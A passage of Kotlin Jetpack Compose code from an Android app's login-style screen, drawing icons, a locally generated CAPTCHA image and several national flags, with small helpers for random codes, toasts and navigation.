            val stroke = Stroke(
                width = 2f * s,
                cap = androidx.compose.ui.graphics.StrokeCap.Round,
                join = androidx.compose.ui.graphics.StrokeJoin.Round
            )
            val col = Ex.Hint

            if (!visible) {
                val p1 = Path().apply {
                    moveTo(17.94f * s, 17.94f * s)
                    cubicTo(16.23f * s, 19.24f * s, 14.15f * s, 20f * s, 12f * s, 20f * s)
                    cubicTo(5f * s, 20f * s, 1f * s, 12f * s, 1f * s, 12f * s)
                    cubicTo(2.9f * s, 9.02f * s, 5.4f * s, 6.72f * s, 6.06f * s, 6.06f * s)
                    moveTo(9.9f * s, 4.24f * s)
                    cubicTo(10.59f * s, 4.07f * s, 11.3f * s, 4f * s, 12f * s, 4f * s)
                    cubicTo(19f * s, 4f * s, 23f * s, 12f * s, 23f * s, 12f * s)
                    cubicTo(22.39f * s, 13.18f * s, 21.57f * s, 14.25f * s, 20.84f * s, 15.19f * s)
                    moveTo(14.12f * s, 14.12f * s)
                    cubicTo(13.45f * s, 14.79f * s, 12.74f * s, 15f * s, 12f * s, 15f * s)
                    cubicTo(10.34f * s, 15f * s, 9f * s, 13.66f * s, 9f * s, 12f * s)
                    cubicTo(9f * s, 11.26f * s, 9.21f * s, 10.55f * s, 9.88f * s, 9.88f * s)
                }
                drawPath(p1, col, style = stroke)
                drawLine(
                    col,
                    Offset(1f * s, 1f * s),
                    Offset(23f * s, 23f * s),
                    strokeWidth = 2f * s,
                    cap = androidx.compose.ui.graphics.StrokeCap.Round
                )
            } else {
                val eye = Path().apply {
                    moveTo(1f * s, 12f * s)
                    cubicTo(1f * s, 12f * s, 5f * s, 4f * s, 12f * s, 4f * s)
                    cubicTo(19f * s, 4f * s, 23f * s, 12f * s, 23f * s, 12f * s)
                    cubicTo(23f * s, 12f * s, 19f * s, 20f * s, 12f * s, 20f * s)
                    cubicTo(5f * s, 20f * s, 1f * s, 12f * s, 1f * s, 12f * s)
                    close()
                }
                drawPath(eye, col, style = stroke)
                drawCircle(col, radius = 3f * s,
                    center = Offset(12f * s, 12f * s), style = stroke)
            }
        }
    }

    @Composable
    fun HomeBadgeIcon() {
        Canvas(modifier = Modifier.size(15.dp)) {
            val s = size.width / 24f
            val stroke = Stroke(
                width = 2f * s,
                cap = androidx.compose.ui.graphics.StrokeCap.Round,
                join = androidx.compose.ui.graphics.StrokeJoin.Round
            )
            val p = Path().apply {
                moveTo(3f * s, 10f * s)
                lineTo(12f * s, 3f * s)
                lineTo(21f * s, 10f * s)
                moveTo(5f * s, 9f * s)
                lineTo(5f * s, 20f * s)
                lineTo(19f * s, 20f * s)
                lineTo(19f * s, 9f * s)
                moveTo(9f * s, 20f * s)
                lineTo(9f * s, 14f * s)
                lineTo(15f * s, 14f * s)
                lineTo(15f * s, 20f * s)
            }
            drawPath(p, Ex.BadgeIco, style = stroke)
        }
    }

    @Composable
    fun BackChevronIcon() {
        Canvas(modifier = Modifier.size(20.dp)) {
            val s = size.width / 24f
            val p = Path().apply {
                moveTo(15f * s, 18f * s)
                lineTo(9f * s, 12f * s)
                lineTo(15f * s, 6f * s)
            }
            drawPath(
                p, Ex.BackBtnIco,
                style = Stroke(
                    width = 2.4f * s,
                    cap = androidx.compose.ui.graphics.StrokeCap.Round,
                    join = androidx.compose.ui.graphics.StrokeJoin.Round
                )
            )
        }
    }

    @Composable
    fun CardTopCurve(modifier: Modifier = Modifier) {
        Canvas(modifier = modifier) {
            val w = size.width
            val h = size.height

            drawCircle(
                brush = Brush.radialGradient(
                    listOf(Color(0x728CB9FF), Color.Transparent),
                    center = Offset(w * 0.5f, h),
                    radius = w * 0.3f
                ),
                radius = w * 0.3f,
                center = Offset(w * 0.5f, h)
            )

            val glow = Path().apply {
                moveTo(0f, 11f / 45f * h)
                quadraticBezierTo(w * 0.5f, 42.5f / 45f * h, w, 11f / 45f * h)
            }
            drawPath(
                glow,
                Color(0x59E8F2FF),
                style = Stroke(width = 1.6f * (w / 100f) * 1.2f)
            )

            val inner = Path().apply {
                moveTo(0f, 1.5f / 35f * h)
                quadraticBezierTo(w * 0.5f, 33f / 35f * h, w, 1.5f / 35f * h)
            }
            drawPath(
                inner,
                Color(0xFFBCD6FF),
                style = Stroke(width = 1.2f * (w / 430f).coerceAtLeast(1f))
            )
        }
    }

    @Composable
    fun CaptchaImage(code: String, modifier: Modifier = Modifier) {
        val capData = remember(code) {
            val cols = listOf(
                0xFF27AE60L, 0xFF2980B9L, 0xFF8E44ADL, 0xFFC0392BL, 0xFF16A085L
            )
            val lines = List(3) {
                CapLine(
                    x1 = Random.nextFloat(), y1 = Random.nextFloat(),
                    x2 = Random.nextFloat(), y2 = Random.nextFloat(),
                    r = Random.nextInt(150), g = Random.nextInt(150), b = Random.nextInt(150)
                )
            }
            val glyphs = code.map { ch ->
                CapGlyph(
                    ch = ch,
                    color = cols[Random.nextInt(cols.size)],
                    rot = (Random.nextFloat() - 0.5f) * 0.7f * 57.2958f,
                    fontSp = 20f + Random.nextFloat() * 6f,
                    dy = Random.nextFloat() * 5f - 2f
                )
            }
            lines to glyphs
        }
        val (lines, glyphs) = capData

        Canvas(modifier = modifier) {
            val w = size.width
            val h = size.height
            val sx = w / 88f
            val sy = h / 40f

            drawRect(Color.White)

            lines.forEach { l ->
                val argb = (0x99L shl 24) or
                    (l.r.toLong() shl 16) or
                    (l.g.toLong() shl 8) or
                    l.b.toLong()
                drawLine(
                    Color(argb),
                    Offset(l.x1 * w, l.y1 * h),
                    Offset(l.x2 * w, l.y2 * h),
                    strokeWidth = 1.2f * sx
                )
            }

            glyphs.forEachIndexed { i, gl ->
                val px = (10f + i * 19f) * sx
                val py = (26f + gl.dy) * sy

                drawContext.canvas.save()
                drawContext.canvas.translate(px, py)
                drawContext.canvas.rotate(gl.rot)
                val paint = APaint().apply {
                    color = gl.color.toInt()
                    textSize = gl.fontSp * sy
                    typeface = ATypeface.create(ATypeface.SERIF, ATypeface.BOLD_ITALIC)
                    isAntiAlias = true
                }
                drawContext.canvas.nativeCanvas.drawText(gl.ch.toString(), 0f, 0f, paint)
                drawContext.canvas.restore()
            }
        }
    }

    // =================================================
    // الأعلام (مرسومة برمجياً)
    // =================================================

    @Composable
    fun FlagIcon(code: String, modifier: Modifier = Modifier) {
        Canvas(modifier = modifier.clip(RoundedCornerShape(3.dp))) {
            val w = size.width
            val h = size.height
            when (code) {
                "sa" -> {
                    drawRect(Color(0xFF165B33))
                    val stroke = h * 0.045f
                    drawLine(Color.White, Offset(w*0.20f, h*0.38f),
                        Offset(w*0.80f, h*0.38f), strokeWidth = stroke)
                    drawLine(Color.White, Offset(w*0.22f, h*0.50f),
                        Offset(w*0.78f, h*0.50f), strokeWidth = stroke)
                    drawLine(Color.White, Offset(w*0.24f, h*0.62f),
                        Offset(w*0.76f, h*0.62f), strokeWidth = stroke)
                }
                "us" -> {
                    val stripe = h / 13f
                    for (i in 0 until 13) {
                        drawRect(
                            color = if (i % 2 == 0) Color(0xFFB22234) else Color.White,
                            topLeft = Offset(0f, i * stripe),
                            size = Size(w, stripe + 1f)
                        )
                    }
                    drawRect(Color(0xFF3C3B6E), topLeft = Offset.Zero,
                        size = Size(w * 0.45f, stripe * 7f))
                }
                "cn" -> {
                    drawRect(Color(0xFFDE2910))
                    drawPath(starPath(w*0.22f, h*0.32f, h*0.22f), Color(0xFFFFDE00))
                }
                "tw" -> {
                    drawRect(Color(0xFFFE0000))
                    drawRect(Color(0xFF000095), topLeft = Offset.Zero,
                        size = Size(w * 0.5f, h * 0.5f))
                    drawCircle(Color.White, radius = h*0.12f,
                        center = Offset(w*0.25f, h*0.25f))
                    drawCircle(Color(0xFF000095), radius = h*0.08f,
                        center = Offset(w*0.25f, h*0.25f))
                }
                "jp" -> {
                    drawRect(Color.White)
                    drawCircle(Color(0xFFBC002D), radius = h*0.3f,
                        center = Offset(w/2f, h/2f))
                }
                "tr" -> {
                    drawRect(Color(0xFFE30A17))
                    drawCircle(Color.White, radius = h*0.3f,
                        center = Offset(w*0.38f, h/2f))
                    drawCircle(Color(0xFFE30A17), radius = h*0.25f,
                        center = Offset(w*0.44f, h/2f))
                    drawPath(starPath(w*0.6f, h/2f, h*0.13f, 180), Color.White)
                }
                "kr" -> {
                    drawRect(Color.White)
                    val d = h * 0.56f
                    val tl = Offset(w/2f - d/2f, h/2f - d/2f)
                    drawArc(Color(0xFFCD2E3A), 180f, 180f, true, tl, Size(d, d))
                    drawArc(Color(0xFF0047A0), 0f, 180f, true, tl, Size(d, d))
                }
                "vn" -> {
                    drawRect(Color(0xFFDA251D))
                    drawPath(starPath(w/2f, h/2f, h*0.28f), Color(0xFFFFFF00))
                }
                "fr" -> {
                    drawRect(Color(0xFF0055A4), size = Size(w/3f, h))
                    drawRect(Color.White, topLeft = Offset(w/3f, 0f),
                        size = Size(w/3f, h))
                    drawRect(Color(0xFFEF4135), topLeft = Offset(2f*w/3f, 0f),
                        size = Size(w/3f, h))
                }
                "pt" -> {
                    drawRect(Color(0xFF046A38), size = Size(w*0.4f, h))
                    drawRect(Color(0xFFDA291C), topLeft = Offset(w*0.4f, 0f),
                        size = Size(w*0.6f, h))
                    drawCircle(Color(0xFFFFE900), radius = h*0.16f,
                        center = Offset(w*0.4f, h/2f))
                }
                "pk" -> {
                    drawRect(Color(0xFF01411C))
                    drawRect(Color.White, size = Size(w*0.25f, h))
                    drawCircle(Color.White, radius = h*0.28f,
                        center = Offset(w*0.62f, h*0.45f))
                    drawCircle(Color(0xFF01411C), radius = h*0.24f,
                        center = Offset(w*0.68f, h*0.4f))
                }
                "ir" -> {
                    drawRect(Color(0xFF239F40), size = Size(w, h/3f))
                    drawRect(Color.White, topLeft = Offset(0f, h/3f),
                        size = Size(w, h/3f))
                    drawRect(Color(0xFFDA0000), topLeft = Offset(0f, 2f*h/3f),
                        size = Size(w, h/3f))
                    drawCircle(Color(0xFFDA0000), radius = h*0.11f,
                        center = Offset(w/2f, h/2f))
                }
                "th" -> {
                    val s = h / 6f
                    drawRect(Color(0xFFA51931), size = Size(w, s))
                    drawRect(Color(0xFFF4F5F8), topLeft = Offset(0f, s),
                        size = Size(w, s))
                    drawRect(Color(0xFF2D2A4A), topLeft = Offset(0f, 2f*s),
                        size = Size(w, 2f*s))
                    drawRect(Color(0xFFF4F5F8), topLeft = Offset(0f, 4f*s),
                        size = Size(w, s))
                    drawRect(Color(0xFFA51931), topLeft = Offset(0f, 5f*s),
                        size = Size(w, s))
                }
                else -> drawRect(Color(0xFF555555))
            }
        }
    }

    private fun starPath(cx: Float, cy: Float, outerR: Float,
                         startDeg: Int = -90): Path {
        val innerR = outerR * 0.382f
        val path = Path()
        for (i in 0 until 10) {
            val angle = Math.toRadians((startDeg + i * 36).toDouble())
            val r = if (i % 2 == 0) outerR else innerR
            val x = cx + (r * Math.cos(angle)).toFloat()
            val y = cy + (r * Math.sin(angle)).toFloat()
            if (i == 0) path.moveTo(x, y) else path.lineTo(x, y)
        }
        path.close()
        return path
    }

    // =================================================
    // مساعدات
    // =================================================

    private fun newCaptchaCode(): String {
        val ch = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
        return buildString {
            repeat(4) { append(ch[Random.nextInt(ch.length)]) }
        }
    }

    private fun newVerifyCode(): String {
        return (100000 + Random.nextInt(900000)).toString()
    }

    private fun showToast(msg: String) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
    }

    private fun goToHome() {
        try {
            startActivity(Intent(this, HomeActivity::class.java))
            finish()
        } catch (_: Exception) {}
    }
}

@Composable
fun AppTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = Ex.BlueAccent,
            background = Ex.Bg4,
            surface = Ex.CardBg,
            onPrimary = Color.White,
            onBackground = Color.White,
            onSurface = Color.White
        )
    ) { content() }
}
